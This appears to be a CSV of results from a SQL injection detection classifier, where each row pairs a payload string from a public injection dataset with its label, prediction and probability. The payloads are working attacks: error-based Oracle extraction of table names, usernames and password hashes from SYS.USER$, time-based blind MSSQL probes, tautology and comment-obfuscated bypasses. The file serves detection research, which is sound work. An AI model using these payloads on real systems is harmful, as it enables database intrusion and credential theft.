text,source,true_label,pred_label,prob_sqli,correct
%29,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999643564224243,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999655485153198,1
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999957799911499,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999648332595825,1
'*',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999738931655884,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999662637710571,1
26 %,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999675750732422,1
'/**/or/**/1/**/ = /**/1,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999724626541138,1
'-',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999706745147705,1
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999783039093018,1
' )  or  ( 'x' = 'x,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.99997878074646,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999651908874512,1
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999796152114868,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999659061431885,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999665021896362,1
' select * from information_schema.tables--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999703168869019,1
' or 1 = 1 or '' = ',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999977707862854,1
' or 1 in  ( select @@version ) --,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999783039093018,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999758005142212,1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999797344207764,1
29 %,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999969482421875,1
' or true--,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999768733978271,1
'; execute immediate 'sel' || 'ect us' || 'er',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999768733978271,1
'hi' or 'x' = 'x';,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999976634979248,1
' or 'unusual'  =  'unusual',syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999773502349854,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999638795852661,1
' or 'whatever' in  ( 'whatever' ),syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.999975323677063,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,syedsaqlainhussain/sql-injection-dataset/sqliv2.csv,1,1,0.9999756813049316,1
